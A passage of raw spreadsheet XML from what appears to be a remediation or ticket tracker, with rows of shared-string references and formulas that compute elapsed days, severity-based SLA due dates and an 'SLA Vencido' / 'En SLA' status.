      <c r="X315" s="11"/>
      <c r="Y315" s="11"/>
      <c r="Z315" s="11"/>
      <c r="AA315" s="8"/>
      <c r="AB315" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC315" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD315" s="32"/>
      <c r="AE315" s="27"/>
      <c r="AF315" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG315" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH315" t="str">
        <f>IFERROR(VLOOKUP(H315,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="316" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A316" s="5">
        <v>315</v>
      </c>
      <c r="B316" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C316" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D316" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E316" s="4"/>
      <c r="F316" s="4"/>
      <c r="G316" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H316" s="4" t="s">
        <v>1335</v>
      </c>
      <c r="I316" s="4"/>
      <c r="J316" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K316" s="4"/>
      <c r="L316" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M316" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N316" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O316" s="6"/>
      <c r="P316" s="6"/>
      <c r="Q316" s="4" t="s">
        <v>1336</v>
      </c>
      <c r="R316" s="4"/>
      <c r="S316" s="22"/>
      <c r="T316" s="8">
        <v>45632</v>
      </c>
      <c r="U316" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V316" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W316" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X316" s="11"/>
      <c r="Y316" s="11"/>
      <c r="Z316" s="11"/>
      <c r="AA316" s="8"/>
      <c r="AB316" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC316" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD316" s="32"/>
      <c r="AE316" s="27"/>
      <c r="AF316" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG316" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH316" t="str">
        <f>IFERROR(VLOOKUP(H316,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="317" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A317" s="5">
        <v>316</v>
      </c>
      <c r="B317" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C317" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D317" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E317" s="4"/>
      <c r="F317" s="4"/>
      <c r="G317" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H317" s="4" t="s">
        <v>1337</v>
      </c>
      <c r="I317" s="4"/>
      <c r="J317" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K317" s="4"/>
      <c r="L317" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M317" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N317" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O317" s="6"/>
      <c r="P317" s="6"/>
      <c r="Q317" s="4" t="s">
        <v>1338</v>
      </c>
      <c r="R317" s="4"/>
      <c r="S317" s="22"/>
      <c r="T317" s="8">
        <v>45632</v>
      </c>
      <c r="U317" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V317" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W317" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X317" s="11"/>
      <c r="Y317" s="11"/>
      <c r="Z317" s="11"/>
      <c r="AA317" s="8"/>
      <c r="AB317" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC317" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD317" s="32"/>
      <c r="AE317" s="27"/>
      <c r="AF317" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG317" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH317" t="str">
        <f>IFERROR(VLOOKUP(H317,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="318" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A318" s="5">
        <v>317</v>
      </c>
      <c r="B318" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C318" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D318" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E318" s="4"/>
      <c r="F318" s="4"/>
      <c r="G318" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H318" s="4" t="s">
        <v>1339</v>
      </c>
      <c r="I318" s="4"/>
      <c r="J318" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K318" s="4"/>
      <c r="L318" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M318" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N318" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O318" s="6"/>
      <c r="P318" s="6"/>
      <c r="Q318" s="4" t="s">
        <v>1340</v>
      </c>
      <c r="R318" s="4"/>
      <c r="S318" s="22"/>
      <c r="T318" s="8">
        <v>45632</v>
      </c>
      <c r="U318" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V318" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W318" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X318" s="11"/>
      <c r="Y318" s="11"/>
      <c r="Z318" s="11"/>
      <c r="AA318" s="8"/>
      <c r="AB318" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC318" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD318" s="32"/>
      <c r="AE318" s="27"/>
      <c r="AF318" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG318" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH318" t="str">
        <f>IFERROR(VLOOKUP(H318,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="319" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A319" s="5">
        <v>318</v>
      </c>
      <c r="B319" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C319" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D319" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E319" s="4"/>
      <c r="F319" s="4"/>
      <c r="G319" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H319" s="4" t="s">
        <v>1341</v>
      </c>
      <c r="I319" s="4"/>
      <c r="J319" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K319" s="4"/>
      <c r="L319" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M319" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N319" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O319" s="6"/>
      <c r="P319" s="6"/>
      <c r="Q319" s="4" t="s">
        <v>1342</v>
      </c>
      <c r="R319" s="4"/>
      <c r="S319" s="22"/>
      <c r="T319" s="8">
        <v>45632</v>
      </c>
      <c r="U319" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V319" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W319" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X319" s="11"/>
      <c r="Y319" s="11"/>
      <c r="Z319" s="11"/>
      <c r="AA319" s="8"/>
      <c r="AB319" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC319" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD319" s="32"/>
      <c r="AE319" s="27"/>
      <c r="AF319" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG319" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH319" t="str">
        <f>IFERROR(VLOOKUP(H319,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="320" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A320" s="5">
        <v>319</v>
      </c>
      <c r="B320" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C320" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D320" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E320" s="4"/>
      <c r="F320" s="4"/>
      <c r="G320" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H320" s="4" t="s">
        <v>1343</v>
      </c>
      <c r="I320" s="4"/>
      <c r="J320" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K320" s="4"/>
      <c r="L320" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M320" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N320" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O320" s="6"/>
      <c r="P320" s="6"/>
      <c r="Q320" s="4" t="s">
        <v>1344</v>
      </c>
      <c r="R320" s="4"/>
      <c r="S320" s="22"/>
      <c r="T320" s="8">
        <v>45632</v>
      </c>
      <c r="U320" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V320" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W320" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X320" s="11"/>
      <c r="Y320" s="11"/>
      <c r="Z320" s="11"/>
      <c r="AA320" s="8"/>
      <c r="AB320" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC320" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD320" s="32"/>
      <c r="AE320" s="27"/>
      <c r="AF320" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG320" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH320" t="str">
        <f>IFERROR(VLOOKUP(H320,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="321" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A321" s="5">
        <v>320</v>
      </c>
      <c r="B321" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C321" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D321" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E321" s="4"/>
      <c r="F321" s="4"/>
      <c r="G321" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H321" s="4" t="s">
        <v>1345</v>
      </c>
      <c r="I321" s="4"/>
      <c r="J321" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K321" s="4"/>
      <c r="L321" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M321" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N321" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O321" s="6"/>
      <c r="P321" s="6"/>
      <c r="Q321" s="4" t="s">
        <v>1346</v>
      </c>
      <c r="R321" s="4"/>
      <c r="S321" s="22"/>
      <c r="T321" s="8">
        <v>45632</v>
      </c>
      <c r="U321" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V321" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W321" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X321" s="11"/>
      <c r="Y321" s="11"/>
      <c r="Z321" s="11"/>
      <c r="AA321" s="8"/>
      <c r="AB321" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC321" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD321" s="32"/>
      <c r="AE321" s="27"/>
      <c r="AF321" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG321" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH321" t="str">
        <f>IFERROR(VLOOKUP(H321,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="322" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A322" s="5">
        <v>321</v>
      </c>
      <c r="B322" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C322" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D322" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E322" s="4"/>
      <c r="F322" s="4"/>
      <c r="G322" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H322" s="4" t="s">
        <v>1347</v>
      </c>
      <c r="I322" s="4"/>
      <c r="J322" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K322" s="4"/>
      <c r="L322" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M322" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N322" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O322" s="6"/>
      <c r="P322" s="6"/>
      <c r="Q322" s="4" t="s">
        <v>1348</v>
      </c>
      <c r="R322" s="4"/>
      <c r="S322" s="22"/>
      <c r="T322" s="8">
        <v>45632</v>
      </c>
      <c r="U322" s="11">
        <f t="shared" ref="U322:U385" ca="1" si="15">TODAY()-T322</f>
        <v>577</v>
      </c>
      <c r="V322" s="8">
        <f t="shared" ref="V322:V385" si="16">IF(M322="Critical",T322+10,IF(M322="High",T322+30,IF(M322="Bad",T322+30,IF(M322="Medium",T322+90,IF(M322="Warm",T322+90,IF(M322="Low",T322+120,IF(M322="Fair",T322+120,IF(M322="Neutral",T322+120,""))))))))</f>
        <v>45722</v>
      </c>
      <c r="W322" s="12" t="str">
        <f t="shared" ref="W322:W385" ca="1" si="17">IF(M322="Critical",IF(U322&gt;10,"SLA Vencido","En SLA"),IF(M322="High",IF(U322&gt;30,"SLA Vencido","En SLA"),IF(M322="Bad",IF(U322&gt;30,"SLA Vencido","En SLA"),IF(M322="Medium",IF(U322&gt;90,"SLA Vencido","En SLA"),IF(M322="Warm",IF(U322&gt;90,"SLA Vencido","En SLA"),IF(M322="Low",IF(U322&gt;120,"SLA Vencido","En SLA"),IF(M322="Fair",IF(U322&gt;120,"SLA Vencido","En SLA"),IF(M322="Neutral",IF(U322&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X322" s="11"/>
      <c r="Y322" s="11"/>
      <c r="Z322" s="11"/>
      <c r="AA322" s="8"/>
      <c r="AB322" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC322" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD322" s="32"/>
      <c r="AE322" s="27"/>
      <c r="AF322" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG322" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH322" t="str">
        <f>IFERROR(VLOOKUP(H322,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="323" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A323" s="5">
        <v>322</v>
      </c>
      <c r="B323" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C323" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D323" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E323" s="4"/>
      <c r="F323" s="4"/>
      <c r="G323" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H323" s="4" t="s">
        <v>1349</v>
      </c>
      <c r="I323" s="4"/>
      <c r="J323" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K323" s="4"/>
      <c r="L323" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M323" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N323" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O323" s="6"/>
      <c r="P323" s="6"/>
      <c r="Q323" s="4" t="s">
        <v>1350</v>
      </c>
      <c r="R323" s="4"/>
      <c r="S323" s="22"/>
      <c r="T323" s="8">
        <v>45632</v>
      </c>
      <c r="U323" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V323" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W323" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X323" s="11"/>
      <c r="Y323" s="11"/>
      <c r="Z323" s="11"/>
      <c r="AA323" s="8"/>
      <c r="AB323" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC323" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD323" s="32"/>
      <c r="AE323" s="27"/>
      <c r="AF323" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG323" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH323" t="str">
        <f>IFERROR(VLOOKUP(H323,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="324" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A324" s="5">
        <v>323</v>
      </c>
      <c r="B324" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C324" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D324" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E324" s="4"/>
      <c r="F324" s="4"/>
      <c r="G324" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H324" s="4" t="s">
        <v>1351</v>
      </c>
      <c r="I324" s="4"/>
      <c r="J324" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K324" s="4"/>
      <c r="L324" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M324" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N324" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O324" s="6"/>
      <c r="P324" s="6"/>
      <c r="Q324" s="4" t="s">
        <v>1352</v>
      </c>
      <c r="R324" s="4"/>
      <c r="S324" s="22"/>
      <c r="T324" s="8">
        <v>45632</v>
      </c>
      <c r="U324" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V324" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W324" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X324" s="11"/>
      <c r="Y324" s="11"/>
      <c r="Z324" s="11"/>
      <c r="AA324" s="8"/>
      <c r="AB324" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC324" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD324" s="32"/>
      <c r="AE324" s="27"/>
      <c r="AF324" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG324" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH324" t="str">
        <f>IFERROR(VLOOKUP(H324,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="325" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A325" s="5">
        <v>324</v>
      </c>
      <c r="B325" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C325" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D325" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E325" s="4"/>
      <c r="F325" s="4"/>
      <c r="G325" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H325" s="4" t="s">
        <v>1353</v>
      </c>
      <c r="I325" s="4"/>
      <c r="J325" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K325" s="4"/>
      <c r="L325" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M325" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N325" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O325" s="6"/>
      <c r="P325" s="6"/>
      <c r="Q325" s="4" t="s">
        <v>1354</v>
      </c>
      <c r="R325" s="4"/>
      <c r="S325" s="22"/>
      <c r="T325" s="8">
        <v>45632</v>
      </c>
      <c r="U325" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V325" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W325" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X325" s="11"/>
      <c r="Y325" s="11"/>
      <c r="Z325" s="11"/>
      <c r="AA325" s="8"/>
      <c r="AB325" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC325" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD325" s="32"/>
      <c r="AE325" s="27"/>
      <c r="AF325" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG325" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH325" t="str">
        <f>IFERROR(VLOOKUP(H325,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="326" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A326" s="5">
        <v>325</v>
      </c>
      <c r="B326" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C326" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D326" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E326" s="4"/>
      <c r="F326" s="4"/>
      <c r="G326" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H326" s="4" t="s">
        <v>1355</v>
      </c>
      <c r="I326" s="4"/>
      <c r="J326" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K326" s="4"/>
      <c r="L326" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M326" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N326" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O326" s="6"/>
      <c r="P326" s="6"/>
      <c r="Q326" s="4" t="s">
        <v>1356</v>
      </c>
      <c r="R326" s="4"/>
      <c r="S326" s="22"/>
      <c r="T326" s="8">
        <v>45632</v>
      </c>
      <c r="U326" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V326" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W326" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X326" s="11"/>
      <c r="Y326" s="11"/>
      <c r="Z326" s="11"/>
      <c r="AA326" s="8"/>
      <c r="AB326" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC326" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD326" s="32"/>
      <c r="AE326" s="27"/>
      <c r="AF326" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG326" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH326" t="str">
        <f>IFERROR(VLOOKUP(H326,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="327" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A327" s="5">
        <v>326</v>
      </c>
      <c r="B327" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C327" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D327" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E327" s="4"/>
      <c r="F327" s="4"/>
      <c r="G327" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H327" s="4" t="s">
        <v>1357</v>
      </c>
      <c r="I327" s="4"/>
      <c r="J327" s="9" t="s">
        <v>1358</v>
      </c>
      <c r="K327" s="4"/>
      <c r="L327" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M327" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N327" s="5" t="s">
        <v>1359</v>
      </c>
      <c r="O327" s="6"/>
      <c r="P327" s="6"/>
      <c r="Q327" s="4" t="s">
        <v>1360</v>
      </c>
      <c r="R327" s="4"/>
      <c r="S327" s="22"/>
      <c r="T327" s="8">
        <v>45745</v>
      </c>
      <c r="U327" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>464</v>
      </c>
      <c r="V327" s="8">
        <f t="shared" si="16"/>
        <v>45835</v>
      </c>
      <c r="W327" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X327" s="11"/>
      <c r="Y327" s="11"/>
      <c r="Z327" s="11"/>
      <c r="AA327" s="8"/>
      <c r="AB327" s="9" t="s">
        <v>1361</v>
      </c>
      <c r="AC327" s="45" t="s">
        <v>950</v>
      </c>
      <c r="AD327" s="32"/>
      <c r="AE327" s="27"/>
      <c r="AF327" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG327" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH327" t="str">
        <f>IFERROR(VLOOKUP(H327,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="328" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A328" s="5">
        <v>327</v>
      </c>
      <c r="B328" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C328" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D328" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E328" s="4"/>
      <c r="F328" s="4"/>
      <c r="G328" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H328" s="4" t="s">
        <v>1362</v>
      </c>
      <c r="I328" s="4"/>
      <c r="J328" s="9" t="s">
        <v>574</v>
      </c>
      <c r="K328" s="4"/>
      <c r="L328" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M328" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N328" s="5" t="s">
        <v>1363</v>
      </c>
      <c r="O328" s="6"/>
      <c r="P328" s="6"/>
      <c r="Q328" s="4" t="s">
        <v>1360</v>
      </c>
      <c r="R328" s="4"/>
      <c r="S328" s="22"/>
      <c r="T328" s="8">
        <v>45632</v>
      </c>
      <c r="U328" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V328" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W328" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X328" s="11"/>
      <c r="Y328" s="11"/>
      <c r="Z328" s="11"/>
      <c r="AA328" s="8"/>
      <c r="AB328" s="9" t="s">
        <v>1364</v>
      </c>
      <c r="AC328" s="45" t="s">
        <v>991</v>
      </c>
      <c r="AD328" s="32"/>
      <c r="AE328" s="27"/>
      <c r="AF328" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG328" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH328" t="str">
        <f>IFERROR(VLOOKUP(H328,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="329" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A329" s="5">
        <v>328</v>
      </c>
      <c r="B329" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C329" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D329" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E329" s="4"/>
      <c r="F329" s="4"/>
      <c r="G329" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H329" s="4" t="s">
        <v>1365</v>
      </c>
      <c r="I329" s="4"/>
      <c r="J329" s="9" t="s">
        <v>574</v>
      </c>
      <c r="K329" s="4"/>
      <c r="L329" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M329" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N329" s="5" t="s">
        <v>1363</v>
      </c>
      <c r="O329" s="6"/>
      <c r="P329" s="6"/>
      <c r="Q329" s="4" t="s">
        <v>1366</v>
      </c>
      <c r="R329" s="4"/>
      <c r="S329" s="22"/>
      <c r="T329" s="8">
        <v>45745</v>
      </c>
      <c r="U329" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>464</v>
      </c>
      <c r="V329" s="8">
        <f t="shared" si="16"/>
        <v>45835</v>
      </c>
      <c r="W329" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X329" s="11"/>
      <c r="Y329" s="11"/>
      <c r="Z329" s="11"/>
      <c r="AA329" s="8"/>
      <c r="AB329" s="9" t="s">
        <v>1364</v>
      </c>
      <c r="AC329" s="45" t="s">
        <v>991</v>
      </c>
      <c r="AD329" s="32"/>
      <c r="AE329" s="27"/>
      <c r="AF329" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG329" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH329" t="str">
        <f>IFERROR(VLOOKUP(H329,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="330" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A330" s="5">
        <v>329</v>
      </c>
      <c r="B330" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C330" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D330" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E330" s="4"/>
      <c r="F330" s="4"/>
      <c r="G330" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H330" s="4" t="s">
        <v>1367</v>
      </c>
      <c r="I330" s="4"/>
      <c r="J330" s="9" t="s">
        <v>574</v>
      </c>
      <c r="K330" s="4"/>
      <c r="L330" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M330" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N330" s="5" t="s">
        <v>1363</v>
      </c>
      <c r="O330" s="6"/>
      <c r="P330" s="6"/>
      <c r="Q330" s="4" t="s">
        <v>1368</v>
      </c>
